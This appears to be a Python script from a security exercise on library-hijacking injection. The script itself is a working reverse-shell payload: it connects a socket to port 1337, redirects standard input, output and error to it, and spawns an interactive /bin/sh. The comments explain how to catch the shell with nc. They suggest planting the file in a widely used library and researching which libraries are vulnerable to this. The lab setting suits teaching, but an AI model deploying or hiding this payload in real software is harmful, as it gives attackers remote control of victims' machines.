# This script takes advantage of process injection. An program looks in PATH for executables, but first it looks within its own folder. 
# If a hacker can alter a trusted folder to include a malicious dependency, 
# it will stop the program from calling the trusted dependency, similar to how PATH injection worked in previous exercises.

import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1",1337))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
# This block of code redirects STDIN, STDOUT, STDERR to port 1337 on the local host.

subprocess.call(["/bin/sh","-i"])
# This opens up a reverse shell. In this case it can be accessed on a different terminal using "nc -l 127.0.0.1 1337".
# Because the current script is imported on LibraryInjection.py, when the target runs that script, it opens the reverse shell.
# Placing this script in a well-used library would work better.
# Research which libraries are vulnerable to this kind of injection.
